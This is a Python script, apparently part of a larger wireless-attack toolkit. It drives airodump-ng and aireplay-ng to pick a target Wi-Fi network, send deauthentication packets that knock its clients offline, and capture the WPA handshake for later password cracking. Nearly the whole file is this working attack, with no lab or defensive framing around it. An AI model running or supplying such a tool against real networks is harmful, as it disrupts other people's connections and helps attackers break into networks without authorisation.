#!/usr/bin/env python3

import subprocess
import psutil
import main
import threading
import time

def handshake():
	while True:
		subprocess.run(["clear"])
		intErface=list(psutil.net_if_stats().keys())
		lenList=len(intErface)
		for serialNum in range(1,(lenList+1)):
			print(str(serialNum)+"."+intErface[serialNum-1])
		print(str(lenList+1)+"."+"Exit")
		print("("+str(lenList+2)+" or 0)"+"."+"Mainmenu")
		try:
			inTerFacE=int(input("Choose the interface you want to capture handshake from : "))
			if inTerFacE <= lenList and inTerFacE != 0:
				inTERFACE=intErface[inTerFacE-1]
				def run_commnd(iTERFACE):
					def networkshow(iTERFACE):
						print("Press Control+C on xterm window once you identified your target networkname on the window")
						subprocess.run(["sudo","rm","-rf","/tmp/wifitemp*"])
						subprocess.run(["xterm","-e","sudo airodump-ng -w /tmp/wifitemp "+iTERFACE])
						subprocess.run(["sh","script.sh"])
						networknum=input("Please Enter the network number: ")
						global packets
						packets=input("Enter the no.of deauthentication packets(any number from 20-50): ")
						bss=(subprocess.check_output(["sh","setmac.sh",networknum])).decode("utf-8")
						global bssid
						bssid=bss.strip()
						chnl=(subprocess.check_output(["sh","setchannel.sh",networknum])).decode("utf-8")
						global chanel
						chanel=chnl.strip()
						print("### Handshake will be stored in this folder with BSSID name" "###")
					def handshakel(bSSid,cHanel,iTERFACE):
						subprocess.run(["xterm","-e","mkdir "+bSSid+";cd "+bSSid+";sudo airodump-ng -d "+bSSid+ " -c "+cHanel+" -w "+bSSid+" "+iTERFACE])
						time.sleep(10)
					def packetsent(bSSid,pacKets,iTERFACE):
						subprocess.run(["xterm","-e","sudo aireplay-ng -a "+bSSid+" --deauth "+pacKets+" "+iTERFACE])
						time.sleep(10)
					networkshow(inTERFACE)
					firsT_thread=threading.Thread(target=handshakel,args=(bssid,chanel,inTERFACE))
					seconD_thread=threading.Thread(target=packetsent,args=(bssid,packets,inTERFACE))
					firsT_thread.start()
					print("Press Control+C if you found WPA-Handshake on xterm window")
					time.sleep(8)
					seconD_thread.start()
					subprocess.run(["clear"])
				run_commnd(inTERFACE)
			elif inTerFacE == lenList+1 and inTerFacE != 0:
				subprocess.run(["clear"])
				exit()
			else:
				subprocess.run(["clear"])
				main.main()
		except ValueError:
			print("Please Enter a Number from above list")
if __name__=="__main__":
	handshake()
